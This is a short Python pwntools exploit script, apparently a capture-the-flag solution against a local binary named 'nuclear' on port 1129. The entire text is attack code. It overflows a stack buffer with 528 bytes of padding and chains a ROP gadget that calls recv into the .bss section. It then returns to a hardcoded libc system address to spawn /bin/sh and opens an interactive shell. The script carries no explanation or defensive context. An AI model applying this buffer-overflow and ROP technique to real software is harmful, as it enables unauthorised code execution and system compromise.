from pwn import *

r = remote("localhost", 1129)
elf = ELF("./nuclear")
recv_plt = elf.plt['recv']
bss = elf.bss()
ppppr = 0x804917c
system_libc = 0xf7616da0
print r.recvuntil(">")
r.sendline("launch")
print r.recvuntil("[+] Enter the passcode to launch the nuclear :")
r.sendline("passcode")
print r.recvuntil("COUNT DOWN : 100")

payload = ""
payload += "a"*528
payload += p32(recv_plt)
payload += p32(ppppr)
payload += p32(4)
payload += p32(bss)
payload += p32(12)
payload += p32(0)

payload += p32(system_libc)
payload += "aaaa"
payload += p32(bss)

r.sendline(payload)
print r.recv(1024)
r.sendline("/bin/sh")
print r.recv(1024)
r.interactive()
                                                          
